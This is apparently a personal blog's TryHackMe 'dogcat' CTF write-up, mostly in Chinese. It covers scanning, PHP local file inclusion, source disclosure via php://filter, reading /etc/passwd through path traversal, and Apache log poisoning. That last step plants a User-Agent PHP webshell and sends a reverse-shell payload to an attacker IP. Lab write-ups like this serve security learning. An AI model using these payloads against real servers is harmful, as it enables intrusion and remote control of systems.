@@ -1,0 +1,686 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Crazyinside">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="12345678910111213141516171819202122232425262728293031323334353637383940Crazy:~&#x2F;tryhackme$ sudo rustscan --no-nmap 10.10.123.163 1-65535 --ulimit 5000">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tryhackme-DogOrCat">
+<meta property="og:url" content="http://example.com/2022/10/06/Tryhackme-DogOrCat/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="12345678910111213141516171819202122232425262728293031323334353637383940Crazy:~&#x2F;tryhackme$ sudo rustscan --no-nmap 10.10.123.163 1-65535 --ulimit 5000">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220805002249855.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220805003145389.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220805003829553.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220805005606078.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220805011549528.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220805022559224.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.889Z">
+<meta property="article:modified_time" content="2022-08-07T13:57:16.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220805002249855.png">
+  
+  
+  
+  <title>Tryhackme-DogOrCat - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Tryhackme-DogOrCat"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          83 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Tryhackme-DogOrCat</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ sudo rustscan --no-nmap 10.10.123.163 1-65535 --<span class="hljs-built_in">ulimit</span> 5000                                                                                                                                                           130 ⨯<br>[sudo] crazyinside 的密码：<br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |<br>| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |<br>`-<span class="hljs-string">&#x27; `-&#x27;</span>`-----<span class="hljs-string">&#x27;`----&#x27;</span>  `-<span class="hljs-string">&#x27;  `----&#x27;</span>  `---<span class="hljs-string">&#x27; `-&#x27;</span>  `-<span class="hljs-string">&#x27;`-&#x27;</span> `-<span class="hljs-string">&#x27;</span><br><span class="hljs-string">Faster Nmap scanning with Rust.</span><br><span class="hljs-string">________________________________________</span><br><span class="hljs-string">: https://discord.gg/GFrQsGy           :</span><br><span class="hljs-string">: https://github.com/RustScan/RustScan :</span><br><span class="hljs-string"> --------------------------------------</span><br><span class="hljs-string">🌍HACK THE PLANET🌍</span><br><span class="hljs-string"></span><br><span class="hljs-string">[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;</span><br><span class="hljs-string">[~] Automatically increasing ulimit value to 5000.</span><br><span class="hljs-string">Open 10.10.123.163:22</span><br><span class="hljs-string">Open 10.10.123.163:80</span><br><span class="hljs-string">10.10.123.163 -&gt; [22,80]</span><br><span class="hljs-string">                                                                                                                                                                                                                                               </span><br><span class="hljs-string">Crazy:~/tryhackme$ sudo nmap -sC -sV -Pn -p 22,80 10.10.123.163               </span><br><span class="hljs-string">Starting Nmap 7.92SVN ( https://parrot.org ) at 2022-08-05 00:16 CST</span><br><span class="hljs-string">Nmap scan report for localhost (10.10.123.163)</span><br><span class="hljs-string">Host is up (0.35s latency).</span><br><span class="hljs-string"></span><br><span class="hljs-string">PORT   STATE SERVICE VERSION</span><br><span class="hljs-string">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="hljs-string">| ssh-hostkey: </span><br><span class="hljs-string">|   2048 2431192ab1971a044e2c36ac840a7587 (RSA)</span><br><span class="hljs-string">|   256 213d461893aaf9e7c9b54c0f160b71e1 (ECDSA)</span><br><span class="hljs-string">|_  256 c1fb7d732b574a8bdcd76f49bb3bd020 (ED25519)</span><br><span class="hljs-string">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="hljs-string">|_http-title: dogcat</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://parrot.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds</span><br><span class="hljs-string">zsh: segmentation fault  sudo nmap -sC -sV -Pn -p 22,80 10.10.123.163</span><br><span class="hljs-string">                                                                                                                                                                                                                                               </span><br><span class="hljs-string">Crazy:~/tryhackme$                               </span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ curl 10.10.123.163                                                                                                                                                                                                    130 ⨯<br>&lt;!DOCTYPE HTML&gt;<br>&lt;html&gt;<br><br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;title&gt;dogcat&lt;/title&gt;<br>    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;/style.css&quot;</span>&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;h1&gt;dogcat&lt;/h1&gt;<br>    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;<br><br>    &lt;div&gt;<br>        &lt;h2&gt;What would you like to see?&lt;/h2&gt;<br>        &lt;a href=<span class="hljs-string">&quot;/?view=dog&quot;</span>&gt;&lt;button <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;dog&quot;</span>&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=<span class="hljs-string">&quot;/?view=cat&quot;</span>&gt;&lt;button <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;cat&quot;</span>&gt;A <span class="hljs-built_in">cat</span>&lt;/button&gt;&lt;/a&gt;&lt;br&gt;<br>            &lt;/div&gt;<br>&lt;/body&gt;<br><br>&lt;/html&gt;<br>            <br></code></pre></td></tr></table></figure>
+
+<h6 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h6><p>PHP,apache,debian.</p>
+<p><img src="https://www.worldisend.com/img/image-20220805002249855.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220805002249855"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Warning: include(dog<span class="hljs-string">&#x27;.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24</span><br><span class="hljs-string"></span><br><span class="hljs-string">Warning: include(): Failed opening &#x27;</span>dog<span class="hljs-string">&#x27;.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/index.php on line 24<br></code></pre></td></tr></table></figure>
+
+<p>文件包含。</p>
+<p><img src="https://www.worldisend.com/img/image-20220805003145389.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220805003145389"></p>
+<p>后端会校验提交的数据中必须有dog或cat。并且会在dog后加一个.php后缀。</p>
+<p><img src="https://www.worldisend.com/img/image-20220805003829553.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220805003829553"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ curl http://10.10.123.163/?view=php://filter/convert.base64-encode/resource=dog/../index                                                                                                                                1 ⨯<br>&lt;!DOCTYPE HTML&gt;<br>&lt;html&gt;<br><br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;title&gt;dogcat&lt;/title&gt;<br>    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;/style.css&quot;</span>&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;h1&gt;dogcat&lt;/h1&gt;<br>    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;<br><br>    &lt;div&gt;<br>        &lt;h2&gt;What would you like to see?&lt;/h2&gt;<br>        &lt;a href=<span class="hljs-string">&quot;/?view=dog&quot;</span>&gt;&lt;button <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;dog&quot;</span>&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=<span class="hljs-string">&quot;/?view=cat&quot;</span>&gt;&lt;button <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;cat&quot;</span>&gt;A <span class="hljs-built_in">cat</span>&lt;/button&gt;&lt;/a&gt;&lt;br&gt;<br>        Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==    &lt;/div&gt;<br>&lt;/body&gt;<br><br>&lt;/html&gt;<br>            <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/tryhackme$ <span class="hljs-built_in">echo</span> PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==|<span class="hljs-built_in">base64</span> -d<br>&lt;!DOCTYPE HTML&gt;<br>&lt;html&gt;<br><br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;title&gt;dogcat&lt;/title&gt;<br>    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;/style.css&quot;</span>&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;h1&gt;dogcat&lt;/h1&gt;<br>    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;<br><br>    &lt;div&gt;<br>        &lt;h2&gt;What would you like to see?&lt;/h2&gt;<br>        &lt;a href=<span class="hljs-string">&quot;/?view=dog&quot;</span>&gt;&lt;button <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;dog&quot;</span>&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=<span class="hljs-string">&quot;/?view=cat&quot;</span>&gt;&lt;button <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;cat&quot;</span>&gt;A <span class="hljs-built_in">cat</span>&lt;/button&gt;&lt;/a&gt;&lt;br&gt;<br>        &lt;?php<br>            <span class="hljs-keyword">function</span> containsStr(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$substr</span>) &#123;<br>                <span class="hljs-built_in">return</span> strpos(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$substr</span>) !== <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-variable">$ext</span> = isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ext&quot;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ext&quot;</span>] : <span class="hljs-string">&#x27;.php&#x27;</span>;<br>            <span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;view&#x27;</span>])) &#123;<br>                <span class="hljs-keyword">if</span>(containsStr(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;view&#x27;</span>], <span class="hljs-string">&#x27;dog&#x27;</span>) || containsStr(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;view&#x27;</span>], <span class="hljs-string">&#x27;cat&#x27;</span>)) &#123;<br>                    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Here you go!&#x27;</span>;<br>                    include <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;view&#x27;</span>] . <span class="hljs-variable">$ext</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Sorry, only dogs or cats are allowed.&#x27;</span>;<br>                &#125;<br>            &#125;<br>        ?&gt;<br>    &lt;/div&gt;<br>&lt;/body&gt;<br><br>&lt;/html&gt;<br>                                                                                                                                                                                                                                               <br>Crazy:~/tryhackme$ <br><br></code></pre></td></tr></table></figure>
+
+<p>如果不设置ext参数，会默认附加.php。提交参数也必须包含一个dog或cat.那就只能采用相对路径对文件进行读取：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dog<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd&amp;&amp;ext=<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220805005606078.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220805005606078"></p>
+<p><img src="https://www.worldisend.com/img/image-20220805011549528.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220805011549528"></p>
+<h6 id="Shell："><a href="#Shell：" class="headerlink" title="Shell："></a>Shell：</h6><p>apche2的日志会记录用户的浏览器头。将浏览器头改成webshell让其记录，然后通过文件包含将其解析为PHP代码从而达到代码执行的效果，需要注意的是,apache日志中浏览器头的标点符号为””。那么写入webshell就无法用双引号否则解析时就会报错。还有平常反弹bash时用的&amp;符，会被http当成一个新参数从而破坏掉整条反弹shell的命令。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?view=dog/../../../../var/log/apache2/access.log&amp;ext=&amp;x=php%20-r%20&#x27;%24sock%3Dfsockopen(%2210.11.75.230%22%2C1337)%3Bexec(%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B&#x27;</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.20.227<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&lt;?php system($_GET[&#x27;x&#x27;]);?&gt;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure>
+
